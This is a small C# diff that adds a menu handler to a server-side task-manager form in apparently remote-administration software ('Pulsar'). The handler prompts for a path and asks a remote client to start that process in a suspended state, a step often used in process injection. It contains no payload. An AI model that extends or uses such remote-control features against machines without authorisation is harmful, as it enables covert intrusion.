@@ -580,6 +580,20 @@ namespace Pulsar.Server.Forms
                 }
             }
         }
+
+        private void createProcessSuspendedToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string processPath = string.Empty;
+
+            if (InputBox.Show("Create Suspended Process", "Enter full path:", ref processPath) == DialogResult.OK)
+            {
+                if (!string.IsNullOrWhiteSpace(processPath))
+                {
+                    _taskManagerHandler.CreateProcessSuspended(processPath.Trim());
+                }
+            }
+        }
+
     }
 
     public class ProcessDataResult
